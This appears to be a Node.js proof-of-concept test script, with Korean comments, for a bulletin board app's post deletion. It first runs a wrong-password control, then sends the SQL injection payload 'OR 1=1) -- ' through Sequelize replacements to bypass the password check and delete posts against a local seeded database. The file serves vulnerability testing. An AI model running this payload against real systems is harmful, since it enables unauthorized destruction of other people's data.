// poc3_delete.js
// 기능3: 게시글 삭제(비밀번호 확인 우회 -> 무단삭제) 테스트만 따로 뺀 파일
// 실행: node poc3_delete.js (별도 서버 실행 불필요)
// 주의: 실행하면 실제로 게시글이 삭제됨. 재테스트 전 node seed.js로 데이터를 리셋해야 함

const { Sequelize, Op } = require('sequelize');
const { sequelize, Post } = require('./models');

async function main() {
  console.log('===== 삭제 테스트 =====');

  const beforeCount = await Post.count();
  console.log('삭제 전 게시글 수:', beforeCount);

  // 정상 동작 확인: 제목은 맞고 비밀번호만 틀리게 삭제 시도 (삭제되지 않아야 정상)
  let rows = await Post.findAll({
    where: {
      [Op.and]: [
        Sequelize.literal(`title = :title`),
        { password: '아무비번' },
      ],
    },
    replacements: { title: '게시판 기능 정리' },
  });
  for (const row of rows) {
    await row.destroy();
  }
  const afterWrongCount = await Post.count();
  console.log('잘못된 비번으로 시도 후 게시글 수:', afterWrongCount, '(변화 없어야 정상)');

// 실제 공격 페이로드로 삭제 시도 조회 로직 자체는 기능2(poc2_secret.js)와 완전히 동일하며 조건에 맞는 글을 찾은 뒤 destroy()만 추가로 붙임
  rows = await Post.findAll({
    where: {
      [Op.and]: [
        Sequelize.literal(`title = :title`),
        { password: ':title' },
      ],
    },
    replacements: { title: 'OR 1=1) -- ' },
  });
  for (const row of rows) {
    await row.destroy();
  }
  const afterAttackCount = await Post.count();
  console.log('공격 후 게시글 수:', afterAttackCount, '(줄어들면 무단삭제 성공한거)');

  await sequelize.close();
}

main().catch((err) => {
  console.log('에러남', err);
  process.exit(1);
});
